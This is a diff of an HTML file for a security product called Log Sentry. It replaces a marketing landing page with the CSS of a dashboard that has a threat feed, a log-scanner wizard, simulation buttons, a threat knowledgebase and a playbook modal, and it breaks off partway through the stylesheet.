@@ -2,211 +2,164 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-  <title>Log Sentry — Universal Behavioral EDR & Supply-Chain Defense</title>
-  <meta name="description" content="Universal host-based EDR detecting AI sandbox escapes, WannaCry ransomware, 'CTRL' spyware, worms, and rogue PRs from low-level OS event logs.">
-  <meta name="keywords" content="EDR, supply chain security, AI sandbox escape, ransomware detection, WannaCry, Git security, host intrusion detection, endpoint security">
-  <meta name="author" content="Vatsal Agarwal">
-  <link rel="canonical" href="https://logsentry.io/">
-
-  <!-- Open Graph & Social Card (1200x630) -->
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://logsentry.io/">
-  <meta property="og:title" content="Log Sentry — Universal Behavioral EDR & Supply-Chain Defense">
-  <meta property="og:description" content="Next-generation host-based EDR detecting AI sandbox escapes, WannaCry ransomware, 'CTRL' spyware, and unauthorized pull requests.">
-  <meta property="og:image" content="https://logsentry.io/static/icon-512.png">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Log Sentry — Universal Behavioral EDR & Supply-Chain Defense">
-  <meta name="twitter:description" content="Next-generation host-based EDR detecting AI sandbox escapes, WannaCry ransomware, 'CTRL' spyware, and unauthorized pull requests.">
-  <meta name="twitter:image" content="https://logsentry.io/static/icon-512.png">
-
-  <!-- Favicons & Mobile Touch Icons -->
-  <link rel="icon" type="image/png" sizes="192x192" href="/static/icon-192.png">
-  <link rel="apple-touch-icon" sizes="192x192" href="/static/icon-192.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Log Sentry - Universal Threat Detection & Remediation EDR</title>
+  <meta name="theme-color" content="#090e17">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Log Sentry">
   <link rel="manifest" href="/manifest.json">
-  <meta name="theme-color" content="#080c14">
-
-  <!-- Typography: Geist + Geist Mono -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@400;600;700&family=Geist:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-
-  <!-- JSON-LD Structured Data Schema -->
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "SoftwareApplication",
-    "name": "Log Sentry EDR",
-    "operatingSystem": "macOS, Windows, Linux, iOS, Android",
-    "applicationCategory": "SecurityApplication",
-    "description": "Universal host-based behavioral endpoint detection & response system intercepting AI sandbox escapes, ransomware, spyware, worms, and rogue Git operations.",
-    "url": "https://logsentry.io/",
-    "author": {
-      "@type": "Person",
-      "name": "Vatsal Agarwal"
-    },
-    "offers": {
-      "@type": "Offer",
-      "price": "0.00",
-      "priceCurrency": "USD"
-    }
-  }
-  </script>
-
   <style>
     :root {
-      --bg: #080c14;
-      --card-bg: #0d1322;
-      --card-border: #162035;
-      --card-border-focus: #1e293b;
+      --bg: #070b12;
+      --card-bg: #0f172a;
+      --card-border: #1e293b;
       --accent: #38bdf8;
-      --accent-muted: rgba(56, 189, 248, 0.12);
-      --accent-border: rgba(56, 189, 248, 0.32);
-      --accent-hover: #0284c7;
+      --accent-glow: rgba(56, 189, 248, 0.25);
       --red: #ef4444;
-      --green: #10b981;
+      --red-bg: rgba(239, 68, 68, 0.15);
       --yellow: #f59e0b;
+      --green: #10b981;
+      --green-bg: rgba(16, 185, 129, 0.15);
       --purple: #a855f7;
       --text-main: #f8fafc;
       --text-sub: #94a3b8;
-      --font-sans: 'Geist', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      --font-mono: 'Geist Mono', ui-monospace, Menlo, Monaco, Consolas, monospace;
-      --ease-out: cubic-bezier(0.23, 1, 0.32, 1);
     }
-
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: var(--font-sans);
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-tap-highlight-color: transparent;
     }
-
     body {
       background-color: var(--bg);
       color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
       overflow-x: hidden;
-      line-height: 1.65;
+      padding-bottom: 70px;
     }
 
-    /* Subtle ambient defense grid - Tinted Neutral (No Lila Mesh) */
-    .bg-grid {
-      position: fixed;
-      inset: 0;
-      background-image: linear-gradient(to right, rgba(255, 255, 255, 0.02) 1px, transparent 1px),
-                        linear-gradient(to bottom, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
-      background-size: 64px 64px;
-      pointer-events: none;
-      z-index: 0;
-    }
-
-    /* Container constraints */
-    .container {
-      max-width: 1180px;
-      margin-inline: auto;
-      padding-inline: 24px;
-      position: relative;
-      z-index: 10;
-    }
-
-    /* Header Navigation */
+    /* Top Navigation Header */
     header {
-      position: sticky;
-      top: 0;
-      z-index: 50;
-      background: rgba(8, 12, 20, 0.88);
+      background: rgba(11, 17, 32, 0.88);
       backdrop-filter: blur(16px);
       -webkit-backdrop-filter: blur(16px);
       border-bottom: 1px solid var(--card-border);
-      padding-block: 14px;
-    }
-    .nav-inner {
+      padding: 12px 20px;
+      position: sticky;
+      top: 0;
+      z-index: 50;
       display: flex;
       justify-content: space-between;
       align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
     }
     .brand {
       display: flex;
       align-items: center;
       gap: 10px;
-      text-decoration: none;
+      cursor: pointer;
     }
     .brand-icon {
       font-size: 1.6rem;
     }
-    .brand-text {
-      font-size: 1.25rem;
+    .brand-name {
+      font-size: 1.15rem;
       font-weight: 800;
+      letter-spacing: -0.02em;
       color: #fff;
-      letter-spacing: -0.03em;
     }
-    .brand-badge {
+    .brand-sub {
       font-size: 0.7rem;
-      background: var(--accent-muted);
       color: var(--accent);
-      border: 1px solid var(--accent-border);
-      padding: 2px 8px;
-      border-radius: 9999px;
-      font-weight: 700;
-      font-family: var(--font-mono);
-      letter-spacing: 0.04em;
-    }
-    .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 28px;
-    }
-    .nav-links a {
-      color: var(--text-sub);
-      text-decoration: none;
-      font-size: 0.88rem;
       font-weight: 600;
-      transition: color 140ms var(--ease-out);
-    }
-    .nav-links a:hover {
-      color: #fff;
-    }
-    .btn-header-cta {
-      background: #111a2e;
-      border: 1px solid #1e2d4a;
-      color: #fff;
-      padding: 8px 16px;
-      border-radius: 8px;
-      font-weight: 600;
-      font-size: 0.85rem;
-      text-decoration: none;
-      transition: background-color 140ms var(--ease-out), border-color 140ms var(--ease-out);
-    }
-    .btn-header-cta:hover {
-      background: var(--accent);
-      color: #080c14;
-      border-color: var(--accent);
+      letter-spacing: 0.06em;
     }
 
-    /* Hero Section */
-    .hero {
-      padding-block: 80px 50px;
-      text-align: center;
+    /* Desktop Navigation Tabs */
+    .desktop-nav {
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 20px;
+      gap: 6px;
+      background: #0b1329;
+      padding: 4px;
+      border-radius: 10px;
+      border: 1px solid var(--card-border);
     }
-    .hero-badge {
-      display: inline-flex;
+    .nav-btn {
+      background: none;
+      border: none;
+      color: var(--text-sub);
+      padding: 8px 14px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .nav-btn:hover {
+      color: #fff;
+      background: rgba(255, 255, 255, 0.05);
+    }
+    .nav-btn.active {
+      color: #fff;
+      background: #1e293b;
+      box-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
+    }
+
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    /* Privacy Shield Status Button */
+    .btn-privacy-shield {
+      display: flex;
       align-items: center;
       gap: 8px;
-      background: var(--accent-muted);
-      border: 1px solid var(--accent-border);
-      color: var(--accent);
-      padding: 5px 14px;
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      color: var(--green);
+      padding: 6px 14px;
       border-radius: 9999px;
-      font-size: 0.82rem;
+      font-size: 0.78rem;
       font-weight: 700;
-      font-family: var(--font-mono);
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-privacy-shield:hover {
+      background: rgba(16, 185, 129, 0.2);
+    }
+    .btn-privacy-shield.alerting {
+      background: rgba(239, 68, 68, 0.15);
+      border-color: rgba(239, 68, 68, 0.45);
+      color: var(--red);
+      animation: pulseAlert 1.5s infinite;
+    }
+    @keyframes pulseAlert {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.03); }
+    }
+
+    /* Device / Host Badge */
+    .host-pill {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(56, 189, 248, 0.1);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      padding: 5px 12px;
+      border-radius: 9999px;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--accent);
     }
     .pulse-dot {
       width: 7px;
@@ -214,936 +167,1269 @@
       border-radius: 50%;
       background: var(--green);
       box-shadow: 0 0 8px var(--green);
-      animation: pulse 2s infinite var(--ease-out);
+      animation: pulse 1.8s infinite;
     }
     @keyframes pulse {
       0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.4; transform: scale(0.85); }
+      50% { opacity: 0.3; transform: scale(0.85); }
     }
 
-    /* Strictly exactly ONE H1 on the document with descender clearance */
-    .hero-headline {
-      font-size: clamp(2.4rem, 5.2vw, 3.9rem);
-      font-weight: 900;
-      letter-spacing: -0.04em;
-      line-height: 1.15;
-      padding-bottom: 6px; /* descender clearance */
-      max-width: 900px;
-      color: #fff;
-    }
-    .accent-emphasis {
-      color: var(--accent);
-      font-style: normal;
-    }
-    .hero-subhead {
-      font-size: clamp(1rem, 2vw, 1.2rem);
-      color: var(--text-sub);
-      max-width: 65ch; /* strict readability bounds */
-      line-height: 1.7;
-    }
-
-    /* Intelligent Device CTA Card */
-    .smart-device-card {
-      background: var(--card-bg);
-      border: 1px solid var(--accent-border);
-      box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.7);
-      border-radius: 18px;
-      padding: 26px 32px;
-      margin-top: 16px;
-      max-width: 580px;
+    /* Main Container */
+    main {
+      flex: 1;
+      max-width: 1280px;
       width: 100%;
+      margin: 0 auto;
+      padding: 20px 16px;
       display: flex;
       flex-direction: column;
-      align-items: center;
-      gap: 14px;
-    }
-    .smart-detected-label {
-      font-size: 0.82rem;
-      font-weight: 600;
-      font-family: var(--font-mono);
-      color: var(--accent);
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .btn-smart-cta {
-      background: var(--accent);
-      color: #080c14;
-      border: none;
-      padding: 15px 32px;
-      border-radius: 10px;
-      font-size: 1.1rem;
-      font-weight: 800;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      width: 100%;
-      text-decoration: none;
-      transition: background-color 150ms var(--ease-out), transform 150ms var(--ease-out);
-    }
-    .btn-smart-cta:hover {
-      background: #7dd3fc;
-      transform: translateY(-2px);
-    }
-    .btn-smart-cta:active {
-      transform: scale(0.98);
-    }
-    .smart-subtext {
-      font-size: 0.8rem;
-      color: var(--text-sub);
-    }
-    .alt-platforms-anchor {
-      color: var(--accent);
-      text-decoration: underline;
-      cursor: pointer;
-      font-weight: 600;
+      gap: 20px;
     }
 
-    /* Official Launch Video Player */
-    .video-container-card {
+    /* Sections / Tabs */
+    .tab-section {
+      display: none;
+      flex-direction: column;
+      gap: 20px;
+      animation: fadeIn 0.25s ease-out;
+    }
+    .tab-section.active {
+      display: flex;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Metrics Grid */
+    .metrics-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 14px;
+    }
+    .metric-card {
       background: var(--card-bg);
-      border: 1px solid var(--accent-border);
-      box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.85), 0 0 25px rgba(56, 189, 248, 0.12);
-      border-radius: 18px;
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      padding: 18px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .metric-label {
+      font-size: 0.8rem;
+      color: var(--text-sub);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .metric-value {
+      font-size: 1.8rem;
+      font-weight: 800;
+    }
+
+    /* Live Feed Container */
+    .feed-container {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 14px;
       overflow: hidden;
-      max-width: 980px;
-      margin-inline: auto;
-      margin-top: 14px;
+      display: flex;
+      flex-direction: column;
     }
-    .video-frame-wrapper {
-      position: relative;
-      width: 100%;
-      padding-top: 56.25%; /* 16:9 Aspect Ratio */
-      background: #000;
-    }
-    .video-frame-wrapper video {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-      border: none;
-    }
-    .video-meta-bar {
+    .feed-header {
+      padding: 16px 20px;
+      border-bottom: 1px solid var(--card-border);
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 16px 24px;
       background: #0b1120;
-      border-top: 1px solid var(--card-border);
-      flex-wrap: wrap;
-      gap: 12px;
     }
-    .video-meta-info {
+    .feed-list {
       display: flex;
-      gap: 10px;
-      flex-wrap: wrap;
+      flex-direction: column;
+      max-height: 480px;
+      overflow-y: auto;
+    }
+    .feed-item {
+      padding: 14px 20px;
+      border-bottom: 1px solid #162035;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      cursor: pointer;
+      transition: background-color 0.15s;
+    }
+    .feed-item:hover {
+      background: #141e33;
+    }
+    .feed-item:last-child {
+      border-bottom: none;
+    }
+    .feed-item.active-threat {
+      border-left: 4px solid var(--red);
+    }
+    .feed-item.passive-threat {
+      border-left: 4px solid var(--purple);
+    }
+    .feed-item.benign {
+      border-left: 4px solid var(--green);
+    }
+
+    /* 3-Step Wizard Layout in Log Scanner */
+    .wizard-container {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 16px;
+      padding: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .wizard-header {
+      display: flex;
+      justify-content: space-between;
       align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
     }
-    .video-pill {
-      font-size: 0.78rem;
-      font-family: var(--font-mono);
-      font-weight: 700;
-      background: var(--accent-muted);
-      color: var(--accent);
-      border: 1px solid var(--accent-border);
-      padding: 4px 10px;
-      border-radius: 6px;
+    .wizard-title {
+      font-size: 1.25rem;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
-    .btn-download-video {
-      background: #111a2e;
-      border: 1px solid #1e2d4a;
-      color: #fff;
-      padding: 8px 16px;
-      border-radius: 8px;
-      font-weight: 700;
-      font-size: 0.84rem;
-      text-decoration: none;
+    .wizard-steps {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 16px;
+    }
+    .wizard-card {
+      background: #090e17;
+      border: 1px solid #1e293b;
+      border-radius: 12px;
+      padding: 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      position: relative;
+    }
+    .step-badge {
       display: inline-flex;
       align-items: center;
       gap: 6px;
-      transition: background-color 140ms var(--ease-out), border-color 140ms var(--ease-out);
-    }
-    .btn-download-video:hover {
-      background: var(--accent);
-      color: #080c14;
-      border-color: var(--accent);
-    }
-
-    /* Threat Vectors Grid */
-    .section-wrap {
-      padding-block: 60px;
-      border-top: 1px solid var(--card-border);
-    }
-    .section-header {
-      text-align: center;
-      margin-bottom: 36px;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-    }
-    .section-title {
-      font-size: 2rem;
+      font-size: 0.72rem;
       font-weight: 800;
-      letter-spacing: -0.03em;
-      line-height: 1.2;
-      padding-bottom: 4px;
-    }
-    .section-sub {
-      color: var(--text-sub);
-      font-size: 0.95rem;
-      max-width: 65ch;
-      margin-inline: auto;
-    }
-    .vectors-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-      gap: 16px;
-    }
-    .vector-card {
-      background: var(--card-bg);
-      border: 1px solid var(--card-border);
-      border-radius: 14px;
-      padding: 22px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      transition: border-color 160ms var(--ease-out), transform 160ms var(--ease-out);
-    }
-    .vector-card:hover {
-      border-color: #2a3a5a;
-      transform: translateY(-2px);
-    }
-    .vector-card h2 {
-      font-size: 1.05rem;
-      font-weight: 700;
-      color: #fff;
-    }
-    .vector-card p {
-      font-size: 0.85rem;
-      color: var(--text-sub);
-      line-height: 1.6;
-    }
-
-    /* Comparison Table Section */
-    .table-container {
-      overflow-x: auto;
-      border: 1px solid var(--card-border);
-      border-radius: 14px;
-      background: var(--card-bg);
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 0.88rem;
-    }
-    th, td {
-      padding: 14px 18px;
-      border-bottom: 1px solid var(--card-border);
-      text-align: left;
-    }
-    th {
-      background: #0b1120;
-      color: var(--text-sub);
-      font-weight: 700;
-      font-size: 0.78rem;
-      letter-spacing: 0.05em;
+      background: rgba(56, 189, 248, 0.1);
+      color: var(--accent);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      padding: 3px 10px;
+      border-radius: 9999px;
+      width: fit-content;
       text-transform: uppercase;
-      font-family: var(--font-mono);
+      letter-spacing: 0.05em;
     }
-    tr:last-child td {
-      border-bottom: none;
-    }
-
-    /* All Platforms Grid */
-    .platforms-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-      gap: 16px;
-    }
-    .platform-card {
-      background: var(--card-bg);
-      border: 1px solid var(--card-border);
-      border-radius: 14px;
-      padding: 22px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      gap: 14px;
-      transition: border-color 160ms var(--ease-out), transform 160ms var(--ease-out);
-    }
-    .platform-card:hover {
-      border-color: #2a3a5a;
-      transform: translateY(-2px);
-    }
-    .platform-card h2 {
-      font-size: 1.1rem;
-      font-weight: 800;
+    .step-heading {
+      font-size: 0.95rem;
+      font-weight: 700;
       color: #fff;
     }
-    .platform-card p {
-      font-size: 0.82rem;
+    .step-desc {
+      font-size: 0.8rem;
       color: var(--text-sub);
       line-height: 1.5;
     }
-    .btn-download-item {
+
+    .log-input-area {
+      width: 100%;
+      height: 140px;
+      background: #060911;
+      border: 1px solid #1e293b;
+      border-radius: 8px;
+      padding: 12px;
+      color: #e2e8f0;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.82rem;
+      resize: vertical;
+      line-height: 1.5;
+    }
+    .log-input-area:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 10px var(--accent-glow);
+    }
+
+    /* Screenshot Dropzone */
+    .screenshot-dropzone {
+      border: 2px dashed #2a3a5a;
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center;
+      background: rgba(8, 14, 26, 0.7);
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+    .screenshot-dropzone:hover, .screenshot-dropzone.dragover {
+      border-color: var(--accent);
+      background: rgba(56, 189, 248, 0.05);
+    }
+    .screenshot-drop-icon {
+      font-size: 1.8rem;
+    }
+    .screenshot-drop-text {
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #cbd5e1;
+    }
+    .screenshot-drop-sub {
+      font-size: 0.75rem;
+      color: var(--text-sub);
+    }
+
+    /* Screenshot Gallery */
+    .screenshot-gallery {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+      gap: 10px;
+      margin-top: 6px;
+    }
+    .screenshot-item {
       background: #111a2e;
       border: 1px solid #1e2d4a;
-      color: #fff;
-      padding: 10px 16px;
       border-radius: 8px;
-      font-weight: 700;
-      font-size: 0.85rem;
-      text-decoration: none;
+      padding: 6px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      position: relative;
+    }
+    .screenshot-thumb {
+      width: 100%;
+      height: 75px;
+      object-fit: cover;
+      border-radius: 6px;
+      background: #000;
+    }
+    .screenshot-info {
+      font-size: 0.7rem;
+      color: var(--text-sub);
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .btn-remove-shot {
+      position: absolute;
+      top: 4px;
+      right: 4px;
+      background: rgba(0, 0, 0, 0.75);
+      border: none;
+      color: #ef4444;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      font-size: 0.75rem;
+      cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 8px;
-      transition: background-color 140ms var(--ease-out), border-color 140ms var(--ease-out);
     }
-    .btn-download-item:hover {
+
+    .btn-action {
+      background: #111a2e;
+      border: 1px solid #1e2d4a;
+      color: #fff;
+      padding: 8px 14px;
+      border-radius: 8px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .btn-action:hover {
+      background: #1e2d4a;
+      border-color: var(--accent);
+    }
+    .btn-action.primary {
       background: var(--accent);
       color: #080c14;
       border-color: var(--accent);
+      font-weight: 800;
+    }
+    .btn-action.primary:hover {
+      background: #7dd3fc;
     }
 
-    /* FAQ Grid */
-    .faq-grid {
+    /* Simulation Control Deck */
+    .sim-panel {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 14px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    .sim-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 10px;
+    }
+    .btn-sim {
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #fff;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 0.88rem;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: left;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      transition: all 0.2s;
+    }
+    .btn-sim:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+    .btn-sim span {
+      font-size: 0.72rem;
+      color: var(--text-sub);
+      font-weight: 400;
+    }
+    .btn-sim.red:hover { border-color: var(--red); }
+    .btn-sim.purple:hover { border-color: var(--purple); }
+    .btn-sim.yellow:hover { border-color: var(--yellow); }
+    .btn-sim.green:hover { border-color: var(--green); }
+
+    /* Threat Knowledgebase Grid */
+    .threat-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
       gap: 16px;
     }
-    .faq-item {
+    .threat-card {
       background: var(--card-bg);
       border: 1px solid var(--card-border);
       border-radius: 12px;
       padding: 18px;
       display: flex;
       flex-direction: column;
-      gap: 6px;
+      gap: 10px;
     }
-    .faq-item h2 {
-      font-size: 0.95rem;
+    .threat-card-title {
+      font-size: 1.05rem;
       font-weight: 700;
-      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
-    .faq-item p {
+    .threat-card p {
       font-size: 0.85rem;
       color: var(--text-sub);
-      line-height: 1.6;
+      line-height: 1.5;
     }
 
-    /* GDPR Art. 6 Cookie Consent Banner (CMP) */
-    .cookie-banner {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      max-width: 440px;
-      width: calc(100% - 40px);
-      background: #0d1424;
-      border: 1px solid var(--accent-border);
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8);
-      border-radius: 14px;
-      padding: 18px;
-      z-index: 100;
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      font-size: 0.84rem;
-      animation: bannerIn 240ms var(--ease-out);
-    }
-    @keyframes bannerIn {
-      from { opacity: 0; transform: translateY(12px) scale(0.96); }
-      to { opacity: 1; transform: translateY(0) scale(1); }
-    }
-    .cookie-banner-actions {
-      display: flex;
-      gap: 8px;
-      justify-content: flex-end;
-    }
-    .btn-cookie {
-      padding: 6px 14px;
-      border-radius: 6px;
-      font-size: 0.8rem;
-      font-weight: 600;
-      cursor: pointer;
-      border: none;
-      transition: background-color 140ms var(--ease-out);
-    }
-    .btn-cookie-primary { background: var(--accent); color: #080c14; font-weight: 700; }
-    .btn-cookie-primary:hover { background: #7dd3fc; }
-    .btn-cookie-secondary { background: #162035; color: var(--text-sub); }
-    .btn-cookie-secondary:hover { color: #fff; }
-
-    /* Modals for Privacy & Terms */
-    .legal-modal-overlay {
+    /* Modal / Playbook Viewer */
+    .modal-overlay {
       display: none;
       position: fixed;
       inset: 0;
-      background: rgba(0, 0, 0, 0.8);
-      backdrop-filter: blur(8px);
-      z-index: 120;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(10px);
+      z-index: 100;
       justify-content: center;
       align-items: center;
-      padding: 20px;
+      padding: 16px;
     }
-    .legal-modal-overlay.active { display: flex; }
-    .legal-modal {
-      background: #0d1424;
+    .modal-overlay.active {
+      display: flex;
+    }
+    .modal-content {
+      background: #0f172a;
       border: 1px solid var(--card-border);
-      border-radius: 16px;
-      max-width: 680px;
+      border-radius: 14px;
+      max-width: 640px;
       width: 100%;
       max-height: 85vh;
       display: flex;
       flex-direction: column;
-      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.9);
-      animation: modalScale 200ms var(--ease-out);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
     }
-    @keyframes modalScale {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
-    .legal-header {
+    .modal-header {
       padding: 16px 20px;
       border-bottom: 1px solid var(--card-border);
       display: flex;
       justify-content: space-between;
       align-items: center;
     }
-    .legal-body {
+    .modal-body {
       padding: 20px;
       overflow-y: auto;
-      font-size: 0.85rem;
-      color: var(--text-sub);
-      line-height: 1.65;
       display: flex;
       flex-direction: column;
-      gap: 12px;
+      gap: 14px;
+      font-size: 0.9rem;
+      line-height: 1.6;
     }
-    .legal-body strong { color: #fff; }
-    .legal-footer {
+    .playbook-box {
+      background: #090e17;
+      border: 1px solid #1e293b;
+      border-radius: 8px;
+      padding: 14px;
+      white-space: pre-wrap;
+      font-family: ui-monospace, Menlo, Consolas, monospace;
+      font-size: 0.82rem;
+      color: #cbd5e1;
+      max-height: 320px;
+      overflow-y: auto;
+    }
+    .modal-footer {
       padding: 14px 20px;
       border-top: 1px solid var(--card-border);
       display: flex;
       justify-content: flex-end;
+      gap: 10px;
     }
+    .btn {
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 0.88rem;
+      cursor: pointer;
+      border: none;
+      transition: all 0.2s;
+    }
+    .btn-secondary { background: #1e293b; color: #fff; }
+    .btn-danger { background: #dc2626; color: #fff; }
+    .btn-danger:hover { background: #ef4444; }
 
-    /* Footer */
-    footer {
-      border-top: 1px solid var(--card-border);
-      background: #05080e;
-      padding-block: 40px;
-      color: var(--text-sub);
-      font-size: 0.82rem;
+    /* -------------------------------------------------------------
+       THE DRM PRIVACY BLACKOUT CURTAIN (NETFLIX-STYLE BLACK SCREEN)
+       ------------------------------------------------------------- */
+    .privacy-blackout-curtain {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #000000 !important;
+      z-index: 999999;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
       text-align: center;
+      padding: 30px;
+      user-select: none;
     }
-    .footer-inner {
+    .privacy-blackout-curtain.active {
+      display: flex;
+    }
+    .drm-shield-box {
+      border: 1px solid #1e293b;
+      background: #05080f;
+      padding: 40px;
+      border-radius: 20px;
+      max-width: 580px;
+      width: 100%;
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 12px;
+      gap: 16px;
+      box-shadow: 0 0 50px rgba(56, 189, 248, 0.15);
     }
-    .footer-links {
-      display: flex;
-      gap: 18px;
+    .drm-shield-icon {
+      font-size: 3.5rem;
+      animation: pulseAlert 2s infinite ease-in-out;
     }
-    .footer-links button, .footer-links a {
+    .drm-title {
+      font-size: 1.4rem;
+      font-weight: 900;
+      color: #fff;
+      letter-spacing: -0.02em;
+    }
+    .drm-tag {
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      color: #f87171;
+      padding: 4px 12px;
+      border-radius: 9999px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      font-family: ui-monospace, monospace;
+    }
+    .drm-desc {
+      font-size: 0.88rem;
+      color: #94a3b8;
+      line-height: 1.6;
+    }
+    .btn-resume-view {
+      background: #111a2e;
+      border: 1px solid #1e2d4a;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-resume-view:hover {
+      background: var(--accent);
+      color: #080c14;
+    }
+
+    /* Mobile Bottom Navigation Bar */
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #090e17;
+      border-top: 1px solid var(--card-border);
+      padding: 8px 12px;
